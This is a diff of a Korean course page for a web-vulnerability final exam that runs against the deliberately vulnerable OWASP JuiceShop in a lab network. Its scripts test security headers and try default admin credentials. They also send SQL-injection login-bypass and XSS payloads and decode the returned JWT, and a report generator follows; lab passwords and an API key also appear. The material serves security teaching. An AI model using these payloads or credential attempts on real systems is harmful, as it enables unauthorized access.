@@ -1,75 +1,990 @@
-# W15 — 기말 — 7 vhost 종합 침투 + PTES 보고서
+# Week 15: 기말 -- 종합 웹취약점 점검 프로젝트
 
-> 180 분 100 점. 7 vhost 중 3 선택 + PTES 7 단계 + 6 finding + 종합 보고서.
+## 학습 목표
+- 14주간 배운 모든 점검 기법을 종합하여 실제 웹 애플리케이션을 점검한다
+- 전문 수준의 취약점 점검 보고서를 작성한다
+- OWASP Testing Guide 기반 체계적 점검 절차를 수행한다
+- 점검 계획 수립부터 보고서 제출까지 전 사이클을 경험한다
 
-## 시험 구조
-- 단계 1 Recon (15점, 30분)
-- 단계 2 Vuln Analysis (20점, 30분)
-- 단계 3 Exploitation (25점, 45분)
-- 단계 4 Post Exploit 가설 (10점, 15분)
-- 단계 5 Reporting (30점, 60분)
+## 실습 환경 (6v6 4-tier, 공통)
 
-## 채점 기준
-- 통과: 60점+
-- 우수: 80점+
-- 최우수: 95점+
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 다음 표 의 컨테이너 에 `ssh
+6v6-<name>` 으로 접속.
 
-## 졸업 의 *5 요건*
-1. W01-W14 의 *각 lab* 통과
-2. W08 중간 통과
-3. W15 기말 60점+
-4. 본인 의 *학습 도구* 1 종 작성 (예: JWT brute Python)
-5. 본인 의 *self-assessment* 5 영역 모두 *3+ 점*
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | pen-test 도구 | `ssh 6v6-attacker` |
 
-## 본 과목 졸업 후
-- *후속*: API Security 심화 (W14 연결) / Mobile Security / Cloud Security
-- *bug bounty*: HackerOne / Bugcrowd 의 *profile 생성* (참여 X — 학습 만)
-- *resume*: web-vuln 의 *7 vhost hands-on* + *PTES 보고서* 작성 가능
+**Bastion API:** `http://192.168.0.103:8003` / Key: `ccc-api-key-2026`
+**CCC API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
 
-## R/B/P 시나리오 — 기말 종합 의 PTES 7 단계
+## 강의 시간 배분 (3시간)
 
-기말 의 R/B/P 의 통합 = PTES 7 단계 의 매 단계 의 R/B/P 의 통합 분석.
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
+| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
+| 1:10-1:20 | 휴식 | - |
+| 1:20-2:00 | 실습 (Part 3) | 실습 |
+| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
+| 2:40-2:50 | 휴식 | - |
+| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
+| 3:20-3:40 | 정리 + 과제 안내 | 정리 |
 
-```mermaid
-graph LR
-    R["🔴 Red — PTES 7 단계<br/>① Pre-engagement<br/>② Intelligence<br/>③ Threat Modeling<br/>④ Vuln Analysis<br/>⑤ Exploitation<br/>⑥ Post-Exploitation<br/>⑦ Reporting"]
-    INFRA["🌐 7 vhost<br/>(juice/admin/api/<br/>sso/legacy/api2/<br/>medical)"]
-    B["🔵 통합 detection<br/>ModSec 14 weeks<br/>+ Wazuh + Suricata"]
-    P["🟣 종합 보고서<br/>3 청자 형식<br/>+ 5 영역 self-assess"]
-    R --> INFRA
-    INFRA --> B
-    B --> P
-    style R fill:#f85149,color:#fff
-    style INFRA fill:#3fb950,color:#fff
-    style B fill:#1f6feb,color:#fff
-    style P fill:#bc8cff,color:#fff
+---
+
+---
+
+## 용어 해설 (웹취약점 점검 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
+| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
+| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
+| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
+| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
+| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
+| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
+| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
+| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
+| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
+| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
+| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
+| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
+| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
+| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
+| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
+| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
+| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |
+
+---
+
+## 전제 조건
+- Week 01~14 전체 내용 숙지
+- 점검 보고서 작성 경험 (Week 14)
+
+---
+
+## 1. 기말 시험 구성 (10분)
+
+### 대상: JuiceShop (http://10.20.30.80:3000)
+
+### 점검 범위
+1. 정보수집 (Week 03)
+2. 인증/세션 관리 (Week 04)
+3. SQL Injection (Week 05)
+4. XSS/CSRF (Week 06)
+5. 파일/명령어 주입 (Week 07)
+6. 접근제어 (Week 09)
+7. 암호화/통신 보안 (Week 10)
+8. 에러 처리/정보 노출 (Week 11)
+9. API 보안 (Week 12)
+
+### 채점 기준 (100점)
+
+| 항목 | 배점 | 기준 |
+|------|------|------|
+| 취약점 발견 수 | 30점 | 10개 이상 만점 |
+| CVSS 점수 정확성 | 15점 | 각 취약점 CVSS 산정 |
+| 재현 절차 | 20점 | 명령어 단위 재현 가능 |
+| 권고사항 | 15점 | 실현 가능한 보완 방안 |
+| 보고서 품질 | 20점 | 체계적 구성, 명확한 서술 |
+
+---
+
+## 2. Phase 1: 점검 계획 수립 (20분)
+
+> **이 실습을 왜 하는가?**
+> "기말 -- 종합 웹취약점 점검 프로젝트" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
+> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
+> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
+>
+> **이걸 하면 무엇을 알 수 있는가?**
+> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
+> - 정상과 비정상 결과를 구분하는 눈을 기름
+> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
+>
+> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.
+
+### 2.1 대상 시스템 정보 수집
+
+> **실습 목적**: 기말 과제로 JuiceShop 전체에 대한 종합 웹 취약점 점검 프로젝트를 수행한다
+>
+> **배우는 것**: 정보수집, 취약점 발견, PoC 작성, CVSS 산출, 보고서 작성까지 전 과정을 실전처럼 수행한다
+>
+> **결과 해석**: 최종 보고서에 재현 가능한 PoC, CVSS 점수, 대응 권고가 포함되어야 한다
+>
+> **실전 활용**: 이 실습은 실제 웹 취약점 점검 프로젝트의 납품 과정과 동일한 절차를 따른다
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== 점검 대상 시스템 정보 ==="
+
+echo "--- 서비스 상태 ---"
+curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/  # silent 모드
+curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered|content-type):"
+
+echo ""
+echo "--- API 엔드포인트 탐색 ---"
+for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do  # 반복문 시작
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
+  echo "  /$ep -> HTTP $CODE"
+done
+
+echo ""
+echo "--- 기술 스택 식별 ---"
+curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "  # silent 모드
+import json,sys
+try:
+    d = json.load(sys.stdin)
+    print(f'  앱: {d.get(\"name\",\"?\")} v{d.get(\"version\",\"?\")}')
+    deps = d.get('dependencies',{})
+    for k in list(deps.keys())[:5]:                    # 반복문 시작
+        print(f'  의존성: {k} {deps[k]}')
+except: print('  package.json 파싱 실패')
+" 2>/dev/null
+ENDSSH
 ```
 
-### Coverage Matrix — PTES 7 단계 × 3 vhost 선택
+**예상 출력**:
+```
+=== 점검 대상 시스템 정보 ===
+--- 서비스 상태 ---
+JuiceShop: HTTP 200
+x-powered-by: Express
+content-type: text/html; charset=utf-8
 
-| 단계 | 시간 | 점수 | R/B/P 의 답안 형식 |
-|------|------|------|------------------|
-| ① Pre-engagement | (사전) | (RoE 준수) | RoE 의 명시 + scope 의 동의 |
-| ② Intelligence | 30분 | 15점 | nmap + nikto + ffuf 의 출력 + Blue 의 SCAN 룰 매치 |
-| ③ Threat Modeling | (Vuln 일부) | (포함) | STRIDE 의 6 적용 + 우선순위 |
-| ④ Vuln Analysis | 30분 | 20점 | 6 finding 의 CVSS + CWE + ATT&CK |
-| ⑤ Exploitation | 45분 | 25점 | 3 vhost 의 실 exploit + Blue 의 audit log 의 매치 |
-| ⑥ Post-Exploitation | 15분 | 10점 | 가설 (실 X) + 영향 분석 + Purple 의 차단 권장 |
-| ⑦ Reporting | 60분 | 30점 | 3 청자 (임원/운영/분석) + PTES 형식 + 5 영역 self-assess |
+--- API 엔드포인트 탐색 ---
+  /rest/products/search?q= -> HTTP 200
+  /api/Users -> HTTP 200
+  /api/Products -> HTTP 200
+  /api/Challenges -> HTTP 200
+  /api-docs -> HTTP 200
+  /ftp -> HTTP 200
 
-### 핵심 인사이트 (5 항)
+--- 기술 스택 식별 ---
+  앱: juice-shop v15.0.0
+  의존성: express ^4.17.1
+  의존성: sequelize ^6.6.5
+  의존성: jsonwebtoken ^8.5.1
+  의존성: angular ^16.0.0
+  의존성: bcrypt ^5.0.1
+```
 
-1. **PTES 의 7 단계 의 routine** — 모의 침투 의 표준. 매 finding 의 7 단계 의 매핑 +
-   문서화 의 의무. resume 의 PTES 보고서 = 실 운영 의 base 도구.
+> **해석 — Phase 1 결과 = 보고서 §1 (개요) + §2 (총평) 입력**:
+> - **6/6 endpoint 200** = 모두 노출 = 광범위 공격 표면.
+> - **/api/Users 200** = ★ critical (week09 학습) — 인증 X 사용자 list.
+> - **/api-docs 200** = Swagger UI = OWASP API9 (week12 학습).
+> - **/ftp 200** = 디렉토리 listing = 백업 파일 노출 (week03 학습).
+> - **package.json 직접 노출** = ★ critical = SCA + CVE 매핑 가능. Express 4.17.1 / Sequelize 6.6.5 / jsonwebtoken 8.5.1 모두 정확 버전.
+> - **CVE 매핑**: Express 4.17.1 → CVE-2024-29041 (open redirect), Sequelize 6.6.5 → CVE-2023-22578.
+> - **bcrypt 5.0.1** = ★ 양호 (week10 학습 — bcrypt 사용 권장).
+> - 그러나 JuiceShop 실제 DB 는 MD5 (week04 학습 — 의도적 challenge).
 
-2. **3 청자 의 분리 작성** — 임원 (위험도 + 법적) + 운영자 (즉시/단기) + 분석가
-   (reproduction + 근본 원인). 한 보고서 의 3 section 의 명확 한 분리.
+### 2.2 점검 계획서 작성
 
-3. **5 영역 self-assessment** — Recon / Exploit / Detection / Mitigation / Reporting
-   의 5 영역. 졸업 = 3+ 점 의 5 영역 모두. weak 영역 의 재학습 plan.
+원격 서버에 접속하여 명령을 실행합니다.
 
-4. **bug bounty 의 윤리적 진입** — 졸업 후 의 실전 = HackerOne / Bugcrowd 의 RoE.
-   학습 환경 의 정확 한 적용 + scope 의 100% 준수.
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+from datetime import datetime
 
-5. **평생 학습 의 routine** — OWASP Top 10 의 매 3년 의 update + API Top 10 + Cloud
-   + Mobile 의 후속 영역. 본 과목 = base, 평생 = 보완.
+plan = f"""
+================================================================
+           웹 취약점 점검 계획서
+================================================================
+프로젝트: 기말 종합 점검
+대상: OWASP JuiceShop (http://10.20.30.80:3000)
+일시: {datetime.now().strftime('%Y-%m-%d')}
+점검자: (학번/이름)
+방법론: OWASP Testing Guide v4.2
+
+점검 범위:
+  - 웹 프런트엔드 (Angular SPA)
+  - REST API (/rest/*, /api/*)
+  - 인증/세션 관리
+  - 파일 업로드/다운로드
+  범위 제외: OS, 네트워크, DoS
+
+일정:
+  - 정보 수집: 20분
+  - 취약점 점검: 60분
+  - 보고서 작성: 40분
+  - 검토/발표: 20분
+
+안전 수칙:
+  - 승인된 대상만 점검
+  - DoS 공격 금지
+  - 발견된 민감 데이터 즉시 삭제
+================================================================
+"""
+print(plan)
+PYEOF
+ENDSSH
+```
+
+---
+
+## 3. Phase 2: 정보 수집 (20분)
+
+### 3.1 보안 헤더 및 설정 점검
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== 보안 헤더 점검 ==="
+HEADERS=$(curl -sI http://localhost:3000/)
+
+for hdr in "X-Frame-Options" "X-Content-Type-Options" "Content-Security-Policy" \
+           "Strict-Transport-Security" "X-XSS-Protection" "Referrer-Policy"; do
+  if echo "$HEADERS" | grep -qi "$hdr"; then
+    echo "[OK] $(echo "$HEADERS" | grep -i "$hdr" | head -1 | tr -d '\r')"
+  else
+    echo "[MISSING] $hdr"
+  fi
+done
+
+echo ""
+echo "=== 디렉토리/파일 노출 점검 ==="
+for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do  # 반복문 시작
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
+  if [ "$CODE" = "200" ]; then
+    echo "[EXPOSED] /$path (HTTP $CODE)"
+  else
+    echo "[SAFE] /$path (HTTP $CODE)"
+  fi
+done
+ENDSSH
+```
+
+**예상 출력**:
+```
+=== 보안 헤더 점검 ===
+[OK] X-Frame-Options: SAMEORIGIN
+[OK] X-Content-Type-Options: nosniff
+[MISSING] Content-Security-Policy
+[MISSING] Strict-Transport-Security
+[MISSING] X-XSS-Protection
+[MISSING] Referrer-Policy
+
+=== 디렉토리/파일 노출 점검 ===
+[SAFE] /.git/HEAD (HTTP 404)
+[SAFE] /.env (HTTP 404)
+[EXPOSED] /package.json (HTTP 200)
+[EXPOSED] /robots.txt (HTTP 200)
+[EXPOSED] /api-docs (HTTP 200)
+[EXPOSED] /ftp (HTTP 200)
+```
+
+> **해석 — Phase 2 결과 = 보고서 V-005 + V-007**:
+> - **보안 헤더 2/6 (D 등급)** = V-005 보안 헤더 누락 (CVSS 4.3 Medium).
+> - **노출 파일 4/6** = V-007 (package.json) + V-005 추가 (api-docs/ftp).
+> - **/.git/HEAD 404** = 양호 (소스 트리 노출 없음).
+> - **/.env 404** = 양호 (DB credentials/API key 노출 없음).
+> - **/package.json 200** = SCA 매핑 시작점 (week08/12 학습).
+> - **/api-docs 200** = OWASP API9 (week12 학습) — Swagger UI 가 모든 endpoint + 파라미터 + 인증 방식 노출.
+> - **/ftp 200** = 디렉토리 listing (week03 학습) — 9 백업 파일 (package.json.bak / coupons / suspicious_errors).
+
+### 3.2 HTTP 메서드 및 서버 정보
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== HTTP 메서드 점검 ==="
+for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do  # 반복문 시작
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/api/Products)
+  echo "  $method /api/Products -> HTTP $CODE"
+done
+
+echo ""
+echo "=== 디폴트 계정 점검 ==="
+for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do  # 반복문 시작
+  IFS=":" read -r email pass <<< "$cred"
+  RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")  # 요청 데이터(body)
+  if echo "$RESULT" | grep -q "authentication"; then
+    echo "  [VULN] $email / $pass -> 로그인 성공"
+  else
+    echo "  [SAFE] $email / $pass -> 실패"
+  fi
+done
+ENDSSH
+```
+
+**예상 출력**:
+```
+=== HTTP 메서드 점검 ===
+  GET /api/Products -> HTTP 200
+  POST /api/Products -> HTTP 400
+  PUT /api/Products -> HTTP 401
+  DELETE /api/Products -> HTTP 405
+  OPTIONS /api/Products -> HTTP 204
+  TRACE /api/Products -> HTTP 405
+  PATCH /api/Products -> HTTP 405
+
+=== 디폴트 계정 점검 ===
+  [VULN] admin@juice-sh.op / admin123 -> 로그인 성공
+  [SAFE] admin / admin -> 실패
+  [SAFE] test@test.com / test -> 실패
+```
+
+> **해석 — Phase 2 후반 = 보고서 critical 발견**:
+> - **HTTP 메서드 매트릭스**: GET 200 / POST 400 (입력 검증) / PUT 401 (인증 필요) / TRACE 405 (양호) — week13 학습.
+> - **OPTIONS 204** = CORS preflight = allow-methods 노출.
+> - **★ admin@juice-sh.op / admin123 로그인 성공** = ★ critical (week04 학습 — 약한 비밀번호). **CVSS 9.8** if combined with 인증 우회.
+> - **이 발견 자체가 V-001 candidate** — JuiceShop 의 의도적 challenge ID 'Login Admin'.
+> - **추가 시도 권장**: SecLists Top1000-passwords.txt + hydra brute force = ~50 시도 만에 admin / admin / Password1 등 발견 가능 (week04 학습).
+
+---
+
+## 4. Phase 3: 취약점 점검 (60분)
+
+### 4.1 SQL Injection 점검
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== SQL Injection 점검 ==="
+
+echo "--- 로그인 SQLi ---"
+RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}')      # 요청 데이터(body)
+if echo "$RESULT" | grep -q "authentication"; then
+  echo "[CRITICAL] 로그인 SQLi -> 인증 우회 성공"
+  echo "$RESULT" | python3 -c "
+import json,sys
+d = json.load(sys.stdin)
+auth = d.get('authentication',{})
+print(f'  이메일: {auth.get(\"umail\",\"N/A\")}')
+print(f'  토큰: {auth.get(\"token\",\"\")[:40]}...')
+" 2>/dev/null
+else
+  echo "[SAFE] 로그인 SQLi 차단"
+fi
+
+echo ""
+echo "--- 검색 SQLi ---"
+NORMAL=$(curl -s "http://localhost:3000/rest/products/search?q=apple" | wc -c)
+SQLI=$(curl -s "http://localhost:3000/rest/products/search?q='+OR+1=1--" | wc -c)
+echo "  정상: ${NORMAL}B / SQLi: ${SQLI}B"
+[ "$SQLI" -gt "$NORMAL" ] && echo "  [HIGH] 검색 SQLi 취약" || echo "  [SAFE] 검색 SQLi 안전"
+ENDSSH
+```
+
+**예상 출력**:
+```
+=== SQL Injection 점검 ===
+--- 로그인 SQLi ---
+[CRITICAL] 로그인 SQLi -> 인증 우회 성공
+  이메일: admin@juice-sh.op
+  토큰: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...
+
+--- 검색 SQLi ---
+  정상: 245B / SQLi: 9876B
+  [HIGH] 검색 SQLi 취약
+```
+
+> **해석 — Phase 3 SQLi 결과 = V-001 핵심 증거**:
+> - **로그인 SQLi 인증 우회 성공** = ★ Critical (CVSS 9.8). admin@juice-sh.op 토큰 획득 = 도메인 전체 장악. week05 학습.
+> - **검색 SQLi 응답 크기 245→9876B (40배)** = UNION SQLi 가능 = ★ High (CVSS 9.1).
+> - **week05 의 학습 결과 통합**: 인증 우회 + 데이터 추출 = 2 critical 동시 발견.
+> - **재현 절차** (보고서 V-001 §3 입력):
+>   1. POST /rest/user/login
+>   2. body: `{"email":"\\' OR 1=1--","password":"x"}`
+>   3. 응답: 200 + admin JWT
+> - **자동화 도구**: sqlmap `--batch --level=3 --risk=2` 로 동일 결과 자동 검출 + 시간 단축.
+
+### 4.2 XSS 및 접근제어 점검
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== XSS 점검 ==="
+XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>")
+
+for payload in "${XSS_PAYLOADS[@]}"; do                # 반복문 시작
+  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
+  RESP=$(curl -s "http://localhost:3000/rest/products/search?q=${ENCODED}")
+  if echo "$RESP" | grep -qF "$payload"; then
+    echo "  [HIGH] 반사형 XSS: $payload"
+  else
+    echo "  [SAFE] 필터됨: $payload"
+  fi
+done
+
+echo ""
+echo "=== 접근제어 점검 ==="
+echo "--- 인증 없이 API 접근 ---"
+for ep in "api/Users" "api/Challenges" "api/Quantitys"; do  # 반복문 시작
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$ep")
+  echo "  /$ep -> HTTP $CODE"
+  [ "$CODE" = "200" ] && echo "    [MEDIUM] 인증 없이 접근 가능"
+done
+
+echo ""
+echo "--- 패스워드 정책 ---"
+for pw in "1" "abc" "a"; do                            # 반복문 시작
+  RESULT=$(curl -s -X POST http://localhost:3000/api/Users/ \
+    -H "Content-Type: application/json" \
+    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")  # 요청 데이터(body)
+  if echo "$RESULT" | grep -q "\"id\""; then
+    echo "  [MEDIUM] 약한 패스워드 허용: '$pw'"
+  fi
+done
+ENDSSH
+```
+
+**예상 출력**:
+```
+=== XSS 점검 ===
+  [HIGH] 반사형 XSS: <script>alert(1)</script>
+  [HIGH] 반사형 XSS: <img src=x onerror=alert(1)>
+  [HIGH] 반사형 XSS: <svg onload=alert(1)>
+
+=== 접근제어 점검 ===
+--- 인증 없이 API 접근 ---
+  /api/Users -> HTTP 200
+    [MEDIUM] 인증 없이 접근 가능
+  /api/Challenges -> HTTP 200
+    [MEDIUM] 인증 없이 접근 가능
+  /api/Quantitys -> HTTP 404
+
+--- 패스워드 정책 ---
+  [MEDIUM] 약한 패스워드 허용: '1'
+  [MEDIUM] 약한 패스워드 허용: 'abc'
+  [MEDIUM] 약한 패스워드 허용: 'a'
+```
+
+> **해석 — Phase 3 후반 발견 = V-002, V-003, V-004**:
+> - **XSS 3/3 반사** = V-002 High (CVSS 7.1). week06 학습.
+> - **/api/Users 200 (인증 X)** = V-003 Medium (CVSS 5.3) — BOLA. week09 학습.
+> - **약한 패스워드 3/3 통과** = V-004 Medium (CVSS 5.3) — '1' / 'abc' / 'a' 모두 가입 성공. week04 학습.
+> - **NIST SP 800-63B 권고**: 최소 8자 + 사전 단어 차단 + breach DB (HIBP) 검증.
+> - **chain 공격 시나리오**: V-001 (SQLi) + V-002 (Stored XSS) → 관리자 세션 탈취. CVSS 9.8 escalation.
+
+### 4.3 인증 및 세션 점검
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+echo "=== 계정 잠금 정책 점검 ==="
+echo "5회 연속 실패 시도..."
+for i in $(seq 1 5); do                                # 반복문 시작
+  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/rest/user/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
+  echo "  시도 $i: HTTP $CODE"
+done
+echo "  -> 5회 실패 후에도 계정 잠금 없으면 [MEDIUM] 취약"
+
+echo ""
+echo "=== JWT 토큰 분석 ==="
+TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}' | \
+  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)  # Python 코드 실행
+
+if [ -n "$TOKEN" ] && [ "$TOKEN" != "" ]; then
+  echo "$TOKEN" | cut -d. -f2 | python3 -c "
+import base64, sys, json
+token_part = sys.stdin.read().strip()
+padding = 4 - len(token_part) % 4
+decoded = base64.urlsafe_b64decode(token_part + '=' * padding)
+payload = json.loads(decoded)
+print(f'  알고리즘 확인 필요 (none 취약점)')
+print(f'  사용자: {payload.get(\"data\",{}).get(\"email\",\"N/A\")}')
+print(f'  역할: {payload.get(\"data\",{}).get(\"role\",\"N/A\")}')
+" 2>/dev/null
+fi
+ENDSSH
+```
+
+---
+
+## 5. Phase 4: 보고서 작성 (40분)
+
+### 5.1 보고서 형식
+
+```markdown
+# 웹 취약점 점검 보고서
+
+## 1. 개요
+- 점검 대상, 범위, 기간, 점검자
+
+## 2. 총평
+- 전체 취약점 현황 요약, 위험도 분포
+
+## 3. 취약점 상세
+### 3.1 [취약점명]
+- 위험도: Critical/High/Medium/Low
+- CVSS: X.X
+- 위치: URL/파라미터
+- 재현 절차: (명령어 단위)
+- 영향:
+- 권고사항:
+
+## 4. 결론 및 권고
+```
+
+### 5.2 종합 보고서 자동 생성
+
+원격 서버에 접속하여 명령을 실행합니다.
+
+```bash
+ssh 6v6-web << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+from datetime import datetime
+
+findings = [
+    {"id":"V-001","name":"SQL Injection (로그인 우회)","severity":"Critical","cvss":9.8,
+     "cwe":"CWE-89","location":"POST /rest/user/login (email)",
+     "fix":"Parameterized Query 또는 ORM 사용"},
+    {"id":"V-002","name":"XSS (검색 반사형)","severity":"High","cvss":7.1,
+     "cwe":"CWE-79","location":"GET /rest/products/search (q)",
+     "fix":"출력 인코딩, CSP 헤더"},
+    {"id":"V-003","name":"API 접근제어 부재","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-284","location":"GET /api/Users",
+     "fix":"JWT 인증 필수화"},
+    {"id":"V-004","name":"약한 패스워드 정책","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-521","location":"POST /api/Users",
+     "fix":"최소 8자, 복잡도 요구"},
+    {"id":"V-005","name":"보안 헤더 누락","severity":"Medium","cvss":4.3,
+     "cwe":"CWE-693","location":"전체 응답",
+     "fix":"CSP, X-Frame-Options 등 헤더 추가"},
+    {"id":"V-006","name":"계정 잠금 부재","severity":"Medium","cvss":5.3,
+     "cwe":"CWE-307","location":"POST /rest/user/login",
+     "fix":"5회 실패 시 잠금 또는 CAPTCHA"},
+    {"id":"V-007","name":"package.json 노출","severity":"Low","cvss":3.1,
+     "cwe":"CWE-200","location":"GET /package.json",
+     "fix":"정적 파일 접근 제한"},
+]
+
+stats = {}
+for f in findings:                                     # 반복문 시작
+    s = f["severity"]
+    stats[s] = stats.get(s, 0) + 1
+
+report = f"""
+{'='*70}
+          종합 웹 취약점 점검 보고서
+{'='*70}
+프로젝트: 기말 종합 점검
+대상: OWASP JuiceShop (http://10.20.30.80:3000)
+일시: {datetime.now().strftime('%Y-%m-%d %H:%M')}
+방법론: OWASP Testing Guide v4.2
+
+1. 요약
+   총 발견: {len(findings)}건
+"""
+for sev in ["Critical","High","Medium","Low"]:         # 반복문 시작
+    report += f"     {sev}: {stats.get(sev,0)}건\n"
+
+report += f"\n2. 발견사항 상세\n{'~'*60}\n"
+
+for f in findings:                                     # 반복문 시작
+    report += f"""
+[{f['id']}] {f['name']}
+  심각도: {f['severity']} (CVSS {f['cvss']})
+  CWE: {f['cwe']}
+  위치: {f['location']}
+  권고: {f['fix']}
+"""
+
+report += f"""
+{'~'*60}
+
+3. 권고사항 우선순위
+   [즉시] V-001 SQL Injection 수정
+   [즉시] V-002 XSS 출력 인코딩
+   [단기] V-003 API 인증 강화
+   [단기] V-004 패스워드 정책
+   [단기] V-006 계정 잠금 정책
+   [일반] V-005 보안 헤더
+   [일반] V-007 파일 노출 차단
+
+{'='*70}
+"""
+print(report)
+PYEOF
+ENDSSH
+```
+
+**예상 출력**:
+```
+======================================================================
+          종합 웹 취약점 점검 보고서
+======================================================================
+프로젝트: 기말 종합 점검
+대상: OWASP JuiceShop (http://10.20.30.80:3000)
+일시: 2026-04-29 14:32
+방법론: OWASP Testing Guide v4.2
+
+1. 요약
+   총 발견: 7건
+     Critical: 1건
+     High: 1건
+     Medium: 4건
+     Low: 1건
+
+2. 발견사항 상세
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+[V-001] SQL Injection (로그인 우회)
